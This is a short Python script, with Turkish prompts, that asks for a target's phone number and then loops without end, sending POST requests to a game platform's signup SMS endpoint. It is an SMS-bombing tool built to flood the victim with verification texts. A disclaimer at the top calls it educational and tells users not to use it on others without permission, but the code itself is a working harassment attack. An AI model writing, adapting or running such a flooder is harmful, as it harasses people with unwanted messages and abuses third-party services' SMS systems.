import requests, random
from time import sleep
import urllib.request
import colorama
"""
Kod ile yapacağınız herhangi bir işlemden ben sorumlu değilim. Bu riski göz önüne alarak kullanın.
This application is for private or educational purposes only.
Do not use it on other people without their permission. 
I do not accept responsibility for caused by the use of this code.
By using the this code,you automatically accept that you yourself are criminally responsible for yourself and you are aware that it violates the guidelines.
"""

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

_phone = input('Hedef Telefon Numarasını Şununla Girin (+):')
_name = ''

for x in range(12):
	_name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	username = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))

_phone9 = _phone[1:]

num = _phone
numplus = '+' + num
print(random.choice(colors))
while True:
#1
    try:
        print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
    except:
        print("Başarısız oldu.")
    print(random.choice(colors))